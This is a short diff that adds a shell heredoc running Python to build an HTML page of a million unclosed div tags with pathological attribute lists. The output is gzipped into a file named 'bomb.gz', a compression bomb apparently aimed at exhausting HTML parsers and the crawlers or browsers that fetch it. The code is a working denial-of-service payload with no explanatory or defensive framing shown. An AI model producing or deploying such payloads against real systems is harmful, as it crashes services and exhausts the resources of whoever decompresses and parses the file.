@@ -1,0 +1,10 @@
+python3 << 'EOF' | gzip -9 > bomb.gz
+print('<!DOCTYPE html><html><head><title>Index</title></head><body>')
+
+# Pathological attribute lists - parser must tokenize every attribute
+for i in range(1000000):
+    print(f'<div id="x{i}" class="a b c d e f g h" data-x="1" data-y="2" data-z="3" style="display:none">')
+
+print('<h1>Welcome</h1>')
+# No closing tags
+EOF
